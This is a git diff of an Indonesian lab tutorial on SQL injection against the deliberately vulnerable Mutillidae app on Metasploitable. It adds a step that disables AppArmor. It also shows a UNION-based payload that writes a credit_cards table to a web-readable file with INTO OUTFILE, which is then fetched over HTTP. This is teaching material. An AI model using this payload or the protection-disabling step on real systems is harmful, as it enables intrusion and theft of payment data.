@@ -32,10 +32,13 @@ select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,
 * **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
   ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)
 
-* **Step 3** : Masukkan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
+* **Step 3** : Matikan AppArmor pada Metasploitable OS dengan `sudo /etc/init.d/apparmor stop`
+AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivitas-aktivitas sistem. Hal ini agar MySQL memiliki akses read/write di directori web app.
+
+* **Step 4** : Masukkan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
 ```
 ' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
 ```
 Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **CCN2.txt**
 
-* **Step 4** : Melihat hasil operasi dengan membuka `http://10.151.36.64/mutillidae/CCN2.txt`
+* **Step 5** : Melihat hasil operasi dengan membuka `http://10.151.36.64/mutillidae/CCN2.txt`
